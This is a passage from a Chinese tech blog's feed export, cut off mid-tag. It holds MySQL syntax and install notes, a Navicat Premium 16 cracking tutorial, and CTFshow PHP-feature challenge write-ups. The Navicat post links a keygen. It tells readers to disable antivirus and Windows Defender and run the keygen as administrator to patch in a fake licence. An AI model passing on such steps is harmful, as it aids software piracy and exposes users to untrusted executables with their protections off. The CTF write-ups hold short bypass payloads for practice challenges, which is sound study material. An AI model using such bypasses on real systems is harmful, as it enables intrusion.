title="2.更改(update)"></a>2.更改(update)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update 表名 set 列名1 = 值1，列名2 = 值2...列名n = 值n;</span><br><span class="line">#对表中的数据，可以通过update命令进行修改,一般都会加上where语句</span><br></pre></td></tr></table></figure><h3 id="3-删除-delete"><a href="#3-删除-delete" class="headerlink" title="3.删除(delete)"></a>3.删除(delete)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete from tablename [where condition]</span><br></pre></td></tr></table></figure><h3 id="4-查询-select"><a href="#4-查询-select" class="headerlink" title="4.查询(select)"></a>4.查询(select)</h3><h4 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name,sal from emp;</span><br></pre></td></tr></table></figure><h4 id="查询不重复的记录"><a href="#查询不重复的记录" class="headerlink" title="查询不重复的记录"></a>查询不重复的记录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct 列名 from 表名;</span><br></pre></td></tr></table></figure><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><p>逻辑运算符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=,&gt;,&lt;,&gt;=,&lt;=,!=,&lt;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from dept where deptno &gt; 2;</span><br></pre></td></tr></table></figure><h4 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h4><p>聚合函数：</p><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>count(列名)</td><td>统计数量</td></tr><tr><td>max(列名)</td><td>最大值</td></tr><tr><td>min(列名)</td><td>最小值</td></tr><tr><td>sum(列名)</td><td>求和</td></tr><tr><td>avg(列名)</td><td>平均值</td></tr></tbody></table><p>聚合函数语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 聚合函数名(列名) from 表;</span><br></pre></td></tr></table></figure><h4 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段列表 from 表名 [where 分组前条件限定] group by 分组字段名 [having 分组后条件过滤];</span><br></pre></td></tr></table></figure><p>注意：分组之后，查询的字段为聚合函数和分组字段，查询其他字段无任何意义。</p><p>where 和having区别：</p><p>执行时机不一样：where是分组之前进行限定，不满足where条件，则不参与分组，而having是分组之后对结果进行过滤。</p><p>可判断的条件不一样：where不能对聚合函数进行判断，having可以</p><p>执行顺序：where&gt;聚合函数&gt;having </p><h4 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 字段列表 from 表名 limit 起始索引，查询条目数;</span><br></pre></td></tr></table></figure><p>起始索引从0开始</p><h4 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from 表名 [where 条件] [order by 列名1[desc|asc],列名2 [desc|asc]....列名n [desc|asc]]</span><br><span class="line"></span><br><span class="line">desc : 降序</span><br><span class="line">asc : 升序</span><br></pre></td></tr></table></figure><h2 id="三-DCL语句"><a href="#三-DCL语句" class="headerlink" title="三.DCL语句"></a>三.DCL语句</h2><h3 id="1-主要是DBA用来管理系统中的对象权限"><a href="#1-主要是DBA用来管理系统中的对象权限" class="headerlink" title="1.主要是DBA用来管理系统中的对象权限."></a>1.主要是DBA用来管理系统中的对象权限.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">创建一个数据库用户wuyu,具有对lq数据库中所有表的查询和添加权限.</span><br><span class="line">mysql&gt; grant select,insert on lq.* to &#x27;wuyu&#x27;@&#x27;localhost&#x27; identified by &#x27;123&#x27;;</span><br><span class="line">Query OK, 0 rows affected, 1 warning (0.22 sec)</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator&gt;mysql -uwuyu -p123</span><br><span class="line">mysql -u用户名 -p密码</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Navicat Premium 16 下载与安装破解教程(详细教程)</title>
      <link href="/2022/08/11/Navicat-Premium-16-%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B-%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/"/>
      <url>/2022/08/11/Navicat-Premium-16-%E4%B8%8B%E8%BD%BD%E4%B8%8E%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B-%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章是基于 WIN10 操作系统下载与安装破解 Navicat；破解教程为使用注册机破解；Navicat 为付费软件，请支持正版</p><h1 id="一-下载-Navicat"><a href="#一-下载-Navicat" class="headerlink" title="一.下载 Navicat"></a>一.下载 Navicat</h1><p>Navicat 官网：<a href="https://www.navicat.com.cn/">www.navicat.com.cn/</a><br>在产品中可以看到很多的产品，点击免费试用 Navicat Premium 即可，是一套多连数据库开发工具，其他的只能连接单一类型数据库</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/VYocNzKUJd.png"></p><p>点击试用</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/c386t81f.bmp"></p><p>选择系统直接下载</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/ywgmhgpj.bmp"></p><h1 id="二-安装-Navicat"><a href="#二-安装-Navicat" class="headerlink" title="二.安装 Navicat"></a>二.安装 Navicat</h1><p>安装很简单，只需选择路径安装就行</p><h1 id="三-激活-Navicat"><a href="#三-激活-Navicat" class="headerlink" title="三.激活 Navicat"></a>三.激活 Navicat</h1><h2 id="1-获取注册机"><a href="#1-获取注册机" class="headerlink" title="1.获取注册机"></a>1.获取注册机</h2><p><a href="https://wwt.lanzouv.com/inIf609eai0h">蓝奏云</a><br>密码:a8a6</p><h2 id="2-使用注册机"><a href="#2-使用注册机" class="headerlink" title="2.使用注册机"></a>2.使用注册机</h2><p>注意：关闭网络，关闭所有杀毒软件，WIN10/11 系统需关闭 Windows Defender 的实时保护<br>下载成功之后使用管理员身份打开注册机</p><h3 id="设置安装路径，点击-Patch"><a href="#设置安装路径，点击-Patch" class="headerlink" title="设置安装路径，点击 Patch"></a>设置安装路径，点击 Patch</h3><p>安装路径为Navicat安装路径</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/RWniK3Ct2R.png"></p><p>出现提示，点击是</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/oWwclfeQwQ.png"></p><h3 id="生成许可证"><a href="#生成许可证" class="headerlink" title="生成许可证"></a>生成许可证</h3><p>在 KeyGen 中选择软件，版本，语言后，点击 Generate，生成许可证</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/DYiwKU34HE.png"></p><p>同时打开 Navicat Premium，点击注册</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/5LSALcFPjA.png"></p><p>将生成的许可证复制到下图位置</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/178glrk9U0.png"></p><h3 id="手动激活"><a href="#手动激活" class="headerlink" title="手动激活"></a>手动激活</h3><p>点击激活后，会出现服务器不可用提示，点击手动激活</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/psMmZmVXM0.png"></p><ol><li>点击手动激活之后，只会出现激活码，将激活码复制到 Request Code 框中</li><li>点击 Generate Activation Code，会在 Activation Code 框中生成激活码</li><li>将 Activation Code 框中的激活码复制到左边的激活码框中，点击激活</li></ol><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/Co0EQYzdSv.png"></p><p>点击激活之后成功会出现永久许可证标识</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/9BlmY48hYj.png"></p><p>进入 Navicat 软件，点击帮助→关于，查看激活信息</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/gRLe9XdWAC.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL 数据库安装与配置</title>
      <link href="/2022/08/09/MYSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/08/09/MYSQL-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="MYSQL数据库配置"><a href="#MYSQL数据库配置" class="headerlink" title="MYSQL数据库配置"></a>MYSQL数据库配置</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://dev.mysql.com/downloads/mysql/">下载地址</a> </p><p>根据需求下载好文件</p><p>解压</p><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>记录下解压文件的地址</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-09205811.png"></p><p>点击设置-&gt;系统-&gt;高级系统设置-&gt;环境变量</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-09210010.png"></p><p>新建，设置环境变量</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-09210211.png"></p><p>点击下面的Path，新增以下变量：</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-09210430.png"></p><h2 id="配置my-ini"><a href="#配置my-ini" class="headerlink" title="配置my.ini"></a>配置my.ini</h2><p>在解压目录下新建my.ini</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-0210639.png"></p><p>输入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[mysql]</span><br><span class="line">default-character-set=utf8</span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line">character-set-server=utf8</span><br><span class="line">default-storage-engine=INNODB</span><br><span class="line">sql_mode=STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>以管理员身份打开CMD</p><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqld --initialize-insecure</span><br></pre></td></tr></table></figure><p>若执行命令成功会在解压目录下生成data的文件夹，若失败请将my.ini文件放入bin目录下再运行</p><h2 id="注册服务"><a href="#注册服务" class="headerlink" title="注册服务"></a>注册服务</h2><p>CMD中输入<code> mysqld -install</code></p><h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net start mysql //启动mysql服务</span><br><span class="line">net stop mysql  //停止mysql服务</span><br></pre></td></tr></table></figure><h2 id="修改默认的账户密码"><a href="#修改默认的账户密码" class="headerlink" title="修改默认的账户密码"></a>修改默认的账户密码</h2><p>在命令行中输入<code> mysqladmin -u root password 1234</code>,这里的<code> 1234</code>就是指默认管理员(root账户)的密码，也可以自行修改为自己喜欢的 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqladmin -u root password 1234</span><br></pre></td></tr></table></figure><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-09211934.png"></p><p>至此配置完成。</p><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p密码</span><br></pre></td></tr></table></figure><p>即可登录</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow php特性</title>
      <link href="/2022/08/07/CTFshow%20php%E7%89%B9%E6%80%A7/"/>
      <url>/2022/08/07/CTFshow%20php%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="web-89"><a href="#web-89" class="headerlink" title="web 89"></a>web 89</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-intval-function.html">intval函数(获取变量的整数型)</a>：如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0</p><p><a href="https://www.runoob.com/php/php-preg_match.html">preg_match() 函数</a></p><p>利用数组绕过正则匹配，使其返回值发生错误而为false</p><p><code>payload：?num[]=1</code></p><h1 id="web-90"><a href="#web-90" class="headerlink" title="web 90"></a>web 90</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>intval($num,0)：</p><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><pre><code>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 “0” 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。</code></pre><p><code>payload：?num=010574 </code>这里我以0开始，意思就是后面的数字将被以8进制的形式读取</p><h1 id="web-91"><a href="#web-91" class="headerlink" title="web 91"></a>web 91</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>考察点：正则表达式修饰符<br> 拓展</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line">$str = &quot;abc\nabc&quot;;</span><br><span class="line">$preg = &quot;/^abc$/m&quot;;</span><br><span class="line">preg_match($preg, $str,$matchs);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点 . 中包含换行符</span><br><span class="line">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span><br><span class="line">$str = &quot;abggab\nacbs&quot;;</span><br><span class="line">$preg = &quot;/b./s&quot;;</span><br><span class="line">preg_match_all($preg, $str,$matchs);</span><br><span class="line">这样匹配到的有三个 bg b\n bs</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配;</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>满足第一个匹配：?cmd=%0aphp，同时不满足第二匹配(固定字符串”php”)</p><h1 id="web-92"><a href="#web-92" class="headerlink" title="web 92"></a>web 92</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload：</p><p><code>?num=0x117c</code></p><p>这里我采用的是16进制绕过</p><h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> intval(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里直接八进制绕过?num=010574</p><h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123; <span class="comment">// 在这个地方需要返回的值不能为0，也就是说0不能在第一位</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://php.p2hp.com/manual/zh/function.strpos.php">strpos函数详解</a></p><p>所以?num=4476.0</p><h1 id="web-95"><a href="#web-95" class="headerlink" title="web 95"></a>web 95</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;<span class="comment">// 点匹配没了</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!strpos(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span 